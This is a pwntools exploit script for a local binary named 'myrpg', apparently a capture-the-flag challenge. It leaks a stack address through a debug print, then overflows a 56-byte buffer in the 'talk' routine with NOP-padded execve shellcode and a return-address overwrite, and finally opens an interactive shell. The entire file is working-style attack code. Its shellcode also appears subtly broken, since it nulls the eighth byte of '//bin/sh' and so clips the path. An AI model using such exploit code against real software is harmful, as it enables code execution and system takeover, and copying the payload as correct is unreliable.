from pwn import *

# Load the binary
binary = "./myrpg"
elf = ELF(binary)

# Connect to the process
p = process(binary)
context.arch = "amd64"

def leak_address():
    """ Exploits the information leak in left_entrance """
    p.sendlineafter(b"# Choose >", b"1")  # Choose "New Game"
    p.sendlineafter(b"# Choose >", b"2")  # Go to the left entrance (left_entrance)
    
    p.recvuntil(b"[DEBUG] dialogue content : ")  
    p.recvline().strip()
    
    p.recvuntil(b"[DEBUG] dialogue address : ")
    leaked_address = int(p.recvline().strip(), 16)
    
    log.info(f"Leaked Address: {hex(leaked_address)}")
    return leaked_address

# Retrieve the leaked address
leaked_addr = leak_address()

shellcode = asm("""
    and rsp, 0xFFFFFFFFFFFFFFF0
    sub rsp, 0x40

    mov rax, 0x68732f6e69622f2f
    mov [rsp], rax

    xor rax, rax
    mov byte [rsp+7], al

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 59
    syscall    
""")

# Build a payload to exploit `talk`
buffer_size = 56
payload = (asm('nop') * (buffer_size - len(shellcode))) + shellcode  # Fill with NOPs until the return address
payload += p64(leaked_addr)
log.info(f"Payload: {payload}")

# Send the payload to `talk`
p.sendlineafter(b"# Choose >", b"4")  # Exit the cave
p.sendlineafter(b"# Choose >", b"1")  # Choose "New Game"
p.sendlineafter(b"# Choose >", b"1")  # Go to `talk`
p.sendlineafter(b"# >", payload)  # Send the payload

p.sendlineafter(b"# Choose >", b"4")  # Exit the cave
p.recvuntil(b"# You managed to exit the cave.\n")

p.interactive()
